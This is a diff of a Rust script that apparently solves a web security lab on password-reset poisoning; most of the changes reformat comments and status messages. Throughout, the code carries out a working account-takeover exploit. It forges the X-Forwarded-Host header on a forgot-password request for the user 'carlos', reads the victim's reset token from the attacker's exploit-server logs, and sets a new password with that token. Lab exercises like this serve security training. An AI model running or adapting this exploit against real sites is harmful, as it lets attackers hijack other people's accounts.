@@ -36,30 +36,46 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0afb0047032e465684620f2100010005.web-security-academy.net"; // change this url to your lab
-    let exploit_server_domain = "exploit-0a4800b90333461a84740e2f016000b2.exploit-server.net"; // change this url to your exploit server
-    let client = build_client(); // build the client which will be used in all subsequent requests
-    let new_password = "Hacked"; // change thin to what you want
-    let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain); // change the dynamically-generating link via X-Forwarded-Host
+    // change this to your lab URL
+    let url = "https://0afb0047032e465684620f2100010005.web-security-academy.net"; 
+    
+    // change this to your exploit server URL
+    let exploit_server_domain = "exploit-0a4800b90333461a84740e2f016000b2.exploit-server.net"; 
+    
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // set the new password
+    // change thin to what you want
+    let new_password = "Hacked"; 
+    
+    // change the dynamically-generating link via X-Forwarded-Host
+    let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain); 
+    
+    // if you changed the link successfully
     if is_changed {
-        // if you changed the link successfully
-        let some_token = extract_token_from_logs(&client, exploit_server_domain); // try to extract the token from the your server logs
+        // try to extract the token from the your server logs
+        let some_token = extract_token_from_logs(&client, exploit_server_domain); 
+
+        // if the extraction is successful and you found the token
         if let Some(token) = some_token {
             println!("{}", token);
-            // if you found the token
-            let password_change = change_password(&client, url, &token, new_password); // try to change the password with the obtained token
+            
+            // try to change the password with the obtained token
+            let password_change = change_password(&client, url, &token, new_password); 
+            
+            // if password is changed successfully
             if let Ok(res) = password_change {
                 println!(
                     "{}",
-                    "3. Changing the password of the carlos.. ☑️".white().bold()
+                    "3. Changing the password of the carlos.. OK".white().bold()
                 )
+                println!(
+                    "{}: {}",
+                    "✅ Password changed to".yellow().bold(),
+                    new_password.green().bold()
+                );
             }
-            println!(
-                "{}: {}",
-                "✅ Password changed to".yellow().bold(),
-                new_password.green().bold()
-            );
-        // decrypt the token
         } else {
             println!("{}", "No tokens found")
         }
@@ -88,15 +104,18 @@ fn change_dynamically_generated_link(
     url: &str,
     exploit_server_domain: &str,
 ) -> bool {
+    // make the request to change link via forgot-password functionality
     let change_link = client
         .post(&format!("{url}/forgot-password"))
         .form(&HashMap::from([("username", "carlos")]))
         .header("X-Forwarded-Host", exploit_server_domain)
         .send();
+
+    // if link is changed successfully
     if let Ok(res) = change_link {
         println!(
             "{}",
-            "1. Change the dynamically generated link via X-Forwarded-Host header.. ☑️"
+            "1. Change the dynamically generated link via X-Forwarded-Host header.. OK"
                 .white()
                 .bold()
         );
@@ -110,18 +129,26 @@ fn change_dynamically_generated_link(
 * Function used to extract the token from the exploit sever logs
 ******************************************************************/
 fn extract_token_from_logs(client: &Client, exploit_server_domain: &str) -> Option<String> {
+    // set the pattern used to extract token
     let pattern = Regex::new("temp-forgot-password-token=(.*) HTTP").unwrap();
+
+    // fetch the log page
     let logs = client
         .get(format!("https://{exploit_server_domain}/log"))
         .send();
+
+    // if fetching is successful
     if let Ok(res) = logs {
+        // try to extract token from the logs
         let body = res.text().unwrap();
         let token = pattern.captures_iter(&body);
+
+        // if extracting is OK and token is found
         if let Some(text) = token.last() {
             let encrypt = text.get(1).unwrap().as_str().to_string();
             println!(
                 "{}",
-                "2. Get temp-forgot-password-token of the victim from exploit sever logs.. ☑️"
+                "2. Get temp-forgot-password-token of the victim from exploit sever logs.. OK"
                     .white()
                     .bold()
             );
